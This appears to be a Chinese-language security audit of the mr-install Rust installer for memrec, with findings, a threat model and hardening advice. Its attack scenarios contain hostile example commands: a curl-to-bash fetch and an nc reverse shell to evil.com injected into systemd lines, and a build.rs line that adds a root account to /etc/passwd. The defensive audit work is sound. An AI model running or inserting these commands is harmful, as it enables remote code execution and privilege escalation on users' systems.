# mr-install 安全分析报告

## 概述
分析 mr-install 一键安装器（版本 0.3.0）存在的潜在安全风险。

## 发现的安全问题

### 1. 模型下载 URL 注入（高风险）
**文件**: `mr-install/src/download.rs:22-30`
```rust
fn build_base_url(opts: &DownloadOptions) -> String {
    if let Some(ref url) = opts.mirror_base_url {
        return url.trim_end_matches('/').to_string();
    }
    if opts.use_hf_mirror {
        return HF_MIRROR_BASE_URL.to_string();
    }
    HF_BASE_URL.to_string()
}
```

**风险**:
- `mirror_base_url` 参数未验证 URL 格式
- 恶意镜像服务器可能提供带恶意代码的 ONNX 模型
- ONNX 模型是二进制文件，可包含任意代码

**攻击场景**:
```bash
# 攻击者控制恶意镜像服务器
mr-install --mirror-base-url "https://evil.com/models"

# evil.com/models/Qdrant--all-MiniLM-L6-v2-onnx/model.onnx
# 包含内存越界、缓冲区溢出或特权提升的恶意模型
```

**缓解措施**:
- 验证 mirror_base_url 必须是已知的安全域名列表
- 下载后校验模型哈希值（SHA256）
- 提供公钥签名验证机制

### 2. cargo install 代码注入（高风险）
**文件**: `mr-install/src/install.rs:14-60`
```rust
let mut cmd = std::process::Command::new(&cargo);
cmd.args(["install", "--locked", crate_name]);

if let Some(ref url) = opts.repo_url {
    cmd.args(["--git", url]);
    println!("    Source: {} ({})", crate_name, url);
}
```

**风险**:
- `repo_url` 参数指向恶意 Git 仓库
- cargo install 会执行构建脚本（build.rs），可能包含任意命令
- 恶意代码在编译时即可执行，无需运行

**攻击场景**:
```bash
# 攻击者克隆 memrec，修改 build.rs
mr-install --repo-url "https://github.com/evil/memrec.git"

# build.rs 内容:
# std::fs::write("/etc/passwd", "newuser:x:0:0::/root:/bin/bash");
```

**缓解措施**:
- 限制 repo_url 为可信仓库列表（官方、gitee 镜像）
- 验证仓库签名（git tag 签名）
- 提供 crates.io 验证机制

### 3. 系统服务权限提升（中风险）
**文件**: `mr-install/src/systemd.rs:35-73`, `mr-install/src/launchd.rs:47-100`

**风险**:
- systemd service 使用 user 模式，权限有限
- 但 service 配置中的 `ExecStart` 和 `ExecStopPost` 可注入命令
- launchd plist 中的 ProgramArguments 可能被篡改

**攻击场景** (Linux):
```bash
# 篡改 service file 注入恶意命令
ExecStart={bin}/memrecd && curl http://evil.com/backdoor.sh | bash
ExecStopPost=/bin/rm -f {home}/memrecd.sock; sh -c "nc evil.com 4444 -e /bin/bash"
```

**实际防御**:
- ✅ 当前实现：service 文件直接生成，无外部输入
- ✅ 硬编码 ExecStart，不含用户输入
- ✅ launchd 也类似

**剩余风险**:
- 如果文件被中间人篡改，可能注入命令

### 4. 目录遍历和文件覆盖（中风险）
**文件**: `mr-install/src/dirs.rs:10-24`
```rust
pub fn default_bin_dir() -> PathBuf {
    #[cfg(target_os = "linux")]
    {
        dirs::home_dir()
            .map(|h| h.join(".local/bin"))
            .unwrap_or_else(|| std::path::PathBuf::from("/usr/local/bin"))
    }
    
    #[cfg(target_os = "macos")]
    {
        dirs::home_dir()
            .map(|h| h.join("bin"))
            .unwrap_or_else(|| std::path::PathBuf::from("/usr/local/bin"))
    }
}
```

**风险**:
- 如果 `HOME` 环境变量被恶意设置，可能将二进制文件写入系统路径
- 攻击者可设置 `HOME=/usr`，导致写入 `/usr/.local/bin/`
- 可能导致系统二进制被覆盖

**攻击场景**:
```bash
export HOME=/usr
mr-install
# 尝试写入 /usr/.local/bin/memrec，可能失败但值得关注
```

**实际防御**:
- ✅ dirs::home_dir() 使用系统 API，不易被简单篡改
- ✅ 需要 root 权限写入系统路径

### 5. 验证测试的安全假设（低风险）
**文件**: `mr-install/src/verify.rs`
```rust
let output = std::process::Command::new(&memrec)
    .args(["add", "test-memory", "--mtype", "conversation"])
    .output()?;
```

**风险**:
- 验证过程中会创建真实记忆
- 如果 memrec 被恶意版本替换，验证流程可能执行任意操作
- 不过这是安装后的验证，不影响安装过程本身

## 攻击者模型分析

### 1. 供应链攻击者
- 控制 Git 仓库或 crates.io 包
- 修改源代码或依赖，植入后门
- **防御**: 使用 --locked，验证依赖哈希

### 2. 镜像服务器攻击者
- 控制模型下载镜像
- 提供恶意 ONNX 模型
- **防御**: 模型哈希校验，签名验证

### 3. 权限提升攻击者
- 利用 service 配置漏洞
- 通过环境变量或配置注入命令
- **防御**: 严格控制 service 文件生成

### 4. 本地用户攻击者（多用户系统）
- 恶意用户利用系统共享 HOME 目录
- 修改 .memrec 配置文件或模型
- **防御**: 文件权限检查（600），用户隔离

## 建议的安全加固措施

### 立即实施（高优先级）

1. **模型哈希校验**
```rust
const MODEL_SHA256: &[(&str, &str)] = &[
    ("model.onnx", "abc123..."),
    ("tokenizer.json", "def456..."),
    // ...
];

fn verify_model_hash(file: &Path, expected: &str) -> Result<bool> {
    let actual = sha256::digest_file(file)?;
    Ok(actual == expected)
}
```

2. **Git 仓库白名单**
```rust
const ALLOWED_REPOS: &[&str] = &[
    "https://github.com/itcraft-cn/memrec",
    "https://gitee.com/itcraft-cn/memrec",
    // 官方镜像
];

fn validate_repo_url(url: &str) -> bool {
    ALLOWED_REPOS.iter().any(|&allowed| url == allowed)
}
```

3. **服务文件完整性检查**
```rust
// 生成服务文件时计算 SHA256
let service_hash = sha256::digest(&service_content);
std::fs::write(&hash_path, service_hash)?;

// 启动前验证
fn verify_service_integrity(service_path: &Path) -> bool {
    // 比较哈希值
}
```

### 中期实施（中优先级）

4. **最小权限原则**
- 确保服务以当前用户运行，不使用 sudo
- 文件权限设置: config.toml (600), data dir (700)
- 避免 world-writable 目录

5. **输入验证和净化**
- 验证所有命令行参数（URL 格式、路径安全）
- 防止目录遍历攻击（`../` 过滤）
- 限制字符串长度和特殊字符

6. **安全审计日志**
```rust
// 记录所有安装操作
struct AuditLog {
    timestamp: DateTime<Utc>,
    action: String,  // "install", "model_download", "service_register"
    params: HashMap<String, String>,
    user: String,
    success: bool,
}
```

### 长期实施（低优先级）

7. **代码签名和验证**
- 发布 GPG 签名版本
- cargo install 验证 crate 签名
- 完整性保护链

8. **沙箱隔离**
- 使用 bubblewrap 或类似容器技术运行服务
- 限制文件系统访问（仅 ~/.memrec）
- 限制网络访问（除非需要）

9. **威胁检测**
- 异常行为检测（大量写入、异常查询）
- 模型文件完整性监控
- 服务配置变更告警

## 风险评估总结

| 威胁类型 | 可能性 | 影响 | 风险等级 | 当前防护 |
|----------|--------|------|----------|----------|
| 恶意模型下载 | 中 | 高 | 高 | 弱（无校验） |
| Git 仓库注入 | 中 | 高 | 高 | 弱（无白名单） |
| Service 命令注入 | 低 | 高 | 中 | 强（硬编码） |
| 目录遍历攻击 | 低 | 中 | 低 | 中（系统API） |
| 权限提升 | 低 | 高 | 低 | 中（用户模式） |

## 紧急修复建议

1. **立即发布 v0.3.1 安全更新**：
   - 添加模型哈希校验（使用官方 SHA256）
   - 限制 --repo-url 到可信源
   - 添加 --verify-hash 选项

2. **更新文档警告**：
   - 警告用户不要使用不可信的 --mirror-base-url
   - 建议使用官方发布渠道
   - 提供安全最佳实践

3. **建立安全响应流程**：
   - 安全漏洞报告渠道（SECURITY.md）
   - 定期安全审计计划
   - 依赖库安全更新监控

## 结论

mr-install 目前存在两个高风险漏洞：
1. 模型下载 URL 未验证，可下载恶意 ONNX 模型
2. Git 仓库 URL 未限制，可指向恶意代码仓库

建议立即实施模型哈希校验和仓库白名单机制。其他安全措施相对完善，但需要持续监控和改进。

**安全评级**: ⚠️ **中等风险**（需要紧急修复）